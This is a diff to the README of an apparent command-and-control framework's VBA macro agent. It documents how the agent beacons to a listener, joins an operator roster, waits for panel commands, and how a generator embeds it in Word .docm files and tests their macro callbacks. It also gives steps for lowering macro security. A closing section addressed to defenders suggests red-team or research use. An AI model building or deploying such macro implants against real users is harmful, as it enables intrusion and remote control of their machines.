@@ -106,7 +106,7 @@ local echo — no `Debug.Print`, no MsgBox.
 
 ## Identity (API version 1)
 
-Session-static headers derived once per `RunAgent()` call; **optional**
+Session-static headers derived once per `RunAgent(...)` call; **optional**
 headers are omitted when undetected, never sent empty:
 
 | Header | Value |
@@ -163,7 +163,7 @@ workflow runs **static contract checks** on the module instead:
 
 - pure ASCII, no BOM (the VBE imports ANSI/ASCII sources),
 - no line over VBA's hard 1023-char limit,
-- the `Public Function RunAgent()` contract needle,
+- the `Public Function RunAgent(` contract needle,
 - exactly one public symbol,
 - balanced `Sub`/`End Sub` and `Function`/`End Function` blocks,
 - well-formed YAML (the workflows parse with actionlint).
@@ -179,15 +179,17 @@ Real verification needs a real Office host:
    Settings → enable macros + *Trust access to the VBA project object
    model* (or lower macro security on a disposable VM).
 2. Open the VBE (Alt+F11) → File → **Import File…** → `vba-agent.bas`.
-3. Immediate window, no listener: `? RunAgent()` → `"fail"` silently (no
-   H_URL). With `H_URL` set to a dead origin → `"fail"` after the transport
-   timeouts. Against the panel: the beacon appears, then `? RunAgent()`
-   blocks in its hold loop while the machine lands in the roster; send
-   `Exit` from the panel → `"exit"`.
+3. Immediate window, no listener: `? RunAgent("http://127.0.0.1:9/x")`
+   → `"fail"` after the transport timeouts (nothing dials there). With
+   neither argument nor an inherited `H_URL` → `"fail"` immediately and
+   silently. Against the panel: the beacon appears, then
+   `? RunAgent("https://<listener>")` blocks in its hold loop while the
+   machine lands in the roster; send `Exit` from the panel → `"exit"`.
 
-The C2's own `DotmGenerator` (Word 2007 COM oracle: `AutomationSecurity=3`
-+ `AccessVBOM`) is the panel-side acceptance path for documents embedding
-this module.
+The C2's own `DotmGenerator` is the panel-side acceptance path for
+documents embedding this module: a structure oracle (`AutomationSecurity=3`
++ `AccessVBOM`) plus a live beacon gate that runs the generated `.docm`
+with macros enabled against a local listener and requires the POST.
 
 ## For defenders
 
